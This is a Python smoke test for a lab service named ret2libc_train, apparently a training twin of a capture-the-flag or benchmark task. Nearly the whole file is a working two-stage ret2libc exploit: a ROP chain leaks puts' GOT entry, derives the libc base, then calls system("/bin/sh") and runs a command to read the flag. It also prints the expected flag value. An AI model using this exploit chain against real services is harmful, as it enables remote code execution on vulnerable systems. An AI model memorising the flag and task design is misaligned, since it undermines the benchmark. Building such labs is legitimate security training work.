#!/usr/bin/env python3
"""Smoke test for ret2libc_train (port 19994): classic ret2libc in two
rounds - puts(GOT[puts]) leaks the libc pointer, the strike round
rides system("/bin/sh") from the derived base. MR6 training twin -
the eval ret2libc targets stay unseen.

The protocol (two rounds on one connection, the service loops on
`name? `):
  1. round 1 (leak): pop_rdi; &GOT[puts]; puts@plt; main - puts
     prints the raw libc pointer (6 bytes), main re-prompts.
  2. round 2 (strike): pop_rdi; "/bin/sh"; ret; system - libc's
     system from the derived base runs the shell, the shell cats the
     flag.

The banner announces the static anchors (no-PIE: fixed per binary).
puts@plt and GOT[puts] are extracted from the binary itself
(objdump). The libc's puts and system offsets are resolved at runtime
from the process' own mapped libc (ctypes + /proc/self/maps), so the
test is toolchain-independent.

Success output:

  FLAG: FLAG{mr6_ret2libc_train_putsleak}
"""

import ctypes
import os
import re
import socket
import struct
import subprocess
import sys

HOST = "127.0.0.1"
PORT = int(os.environ.get("SMOKE_PORT", 19994))
BIN = os.environ.get("SMOKE_BIN", "ret2libc_train")

PAD = 16  # measured: the return slot sits at +16


def recv_until(s, needle, limit=8192, t=5.0):
    s.settimeout(t)
    data = b""
    while needle not in data and len(data) < limit:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def binary_constants(path):
    """Extract puts@plt and GOT[puts] from the binary (objdump)."""
    dis = subprocess.check_output(["objdump", "-d", path]).decode()
    m = re.search(r"([0-9a-f]+) <puts@plt>", dis)
    puts_plt = int(m.group(1), 16)
    relocs = subprocess.check_output(["objdump", "-R", path]).decode()
    got = None
    for line in relocs.splitlines():
        if "puts" in line and ("JUMP_SLOT" in line or "GLOB_DAT" in line):
            got = int(line.split()[0], 16)
            break
    assert got, "no puts JUMP_SLOT in relocations"
    return puts_plt, got


def libc_offsets():
    """Resolve the local libc's puts and system offsets at runtime
    (ctypes maps the library, /proc/self/maps finds its base)."""
    libc = ctypes.CDLL("libc.so.6")
    puts_ptr = ctypes.cast(libc.puts, ctypes.c_void_p).value
    system_ptr = ctypes.cast(libc.system, ctypes.c_void_p).value
    assert puts_ptr and system_ptr, "libc symbols not resolved"
    with open("/proc/self/maps") as f:
        for line in f:
            if "libc.so.6" in line and "r--p 00000000" in line:
                base = int(line.split("-")[0], 16)
                return puts_ptr - base, system_ptr - base
    raise RuntimeError("libc base not found in /proc/self/maps")


def main():
    puts_plt, got = binary_constants(BIN)
    puts_off, system_off = libc_offsets()
    print(f"[+] binary: puts@plt={puts_plt:#x} GOT[puts]={got:#x}")
    print(f"[+] libc:   puts_off={puts_off:#x} system_off={system_off:#x}")

    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
    except OSError as e:
        print(
            f"SKIP: port {PORT} not listening ({e}); "
            "the lab stack is not running - deploy it and re-run"
        )
        return 0

    banner = recv_until(s, b"name? ")
    text = banner.decode(errors="replace")
    print(f"[+] banner: {text.strip()[:120]}")

    def addr(name):
        m = re.search(rf"{name}\(\) at (0x[0-9a-f]+)", text)
        assert m, f"no {name}() leak in the banner: {text!r}"
        return int(m.group(1), 16)

    pop_rdi = addr("pop_rdi")
    sh = addr("sh")
    main_ = addr("main")
    ret_g = addr("ret")
    print(f"[+] banner: pop_rdi={pop_rdi:#x} ret={ret_g:#x} sh={sh:#x} main={main_:#x}")

    # round 1: leak puts(GOT[puts]) through puts@plt
    leak_chain = b"A" * PAD + struct.pack("<QQQQ", pop_rdi, got, puts_plt, main_)
    s.send(leak_chain + b"\n")
    out = recv_until(s, b"hello\n")
    # the raw leak: puts prints the GOT entry's raw bytes (a 6-byte
    # libc pointer) BEFORE the "hello" echo and the next banner
    leak = out.split(b"hello")[0]
    leak = leak.strip()
    print(f"[+] raw leak bytes: {leak!r}")
    assert len(leak) >= 6, f"leak too short: {leak!r}"
    # strip the banner that rides after (puts' output is the FIRST 6
    # bytes); the leak is the first 6 bytes padded to 8
    libc_ptr = struct.unpack("<Q", leak[:6].ljust(8, b"\x00"))[0]
    print(f"[+] libc puts at {libc_ptr:#x}")

    # derive the libc base and the strike's system address
    libc_base = libc_ptr - puts_off
    system = libc_base + system_off
    print(f"[+] libc base: {libc_base:#x} -> system at {system:#x}")
    assert libc_base & 0xFFF == 0, f"libc base not page-aligned: {libc_base:#x}"

    # round 2: strike system("/bin/sh"); the ret gadget keeps the
    # stack ABI-aligned (system's SSE prologue faults on misalignment)
    strike_chain = b"A" * PAD + struct.pack("<QQQQ", pop_rdi, sh, ret_g, system)
    s.send(strike_chain + b"\n")
    s.send(b"cat ret2libc_train.flag\n")
    out = recv_until(s, b"FLAG:")
    try:
        out += s.recv(4096)
    except (socket.timeout, TimeoutError):
        pass
    print(f"[+] output: {out.strip()[-120:]!r}")
    assert b"FLAG{mr6_ret2libc_train_putsleak}" in out, "oracle flag missing"
    print("[+] ret2libc_train SMOKE TEST PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
